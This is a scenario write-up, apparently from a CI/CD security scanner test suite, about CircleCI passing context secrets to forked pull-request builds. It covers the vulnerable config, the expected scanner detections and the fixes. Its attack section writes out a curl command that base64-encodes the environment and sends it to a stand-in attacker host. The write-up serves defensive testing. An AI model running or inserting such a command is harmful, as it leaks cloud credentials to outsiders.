# Scenario 87: CircleCI — secrets passed to forked PRs

**Provider:** CircleCI · **OWASP:** CICD-SEC-6 (Insufficient Credential Hygiene) · CICD-SEC-4 · **Severity: critical**

**Vulnerable pipeline:** [`.circleci/config.yml`](.circleci/config.yml)

## The pattern

A job consumes a **context** secret and runs on PR builds, while the project
has both **Build forked pull requests** and **Pass secrets to builds from
forked pull requests** enabled:

```yaml
jobs:
  - deploy:
      context: aws-production   # long-lived cloud secrets
```

## How an attacker exploits it

Any low-privilege user opens a fork PR editing `.circleci/config.yml` to
`run: curl https://attacker/?env=$(env | base64)` and exfiltrates every secret
in scope. Documented by Nathan Davison ("Shaking secrets out of CircleCI
builds") and CircleCI's own forked-PR advisory.

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `CC-030` — workflow job uses a context without a branch filter / approval gate |
| Checkov | — |

> The two toggles are account/project settings (not in the file); `CC-030`
> flags the in-file half — a context-secret job with no gate restricting it to
> trusted refs, which is exactly what lets a fork PR reach the secret.

## Fix

Disable "Pass secrets to forked PRs"; restrict contexts by team/branch; gate
secret jobs to protected branches; prefer OIDC short-lived credentials over
long-lived context secrets.

## References

- Nathan Davison — Shaking secrets out of CircleCI builds: https://nathandavison.com/blog/shaking-secrets-out-of-circleci-builds
- CircleCI — security advisory (secrets in forked-PR builds): https://discuss.circleci.com/t/security-advisory-secrets-in-builds-from-forked-pull-requests/54554
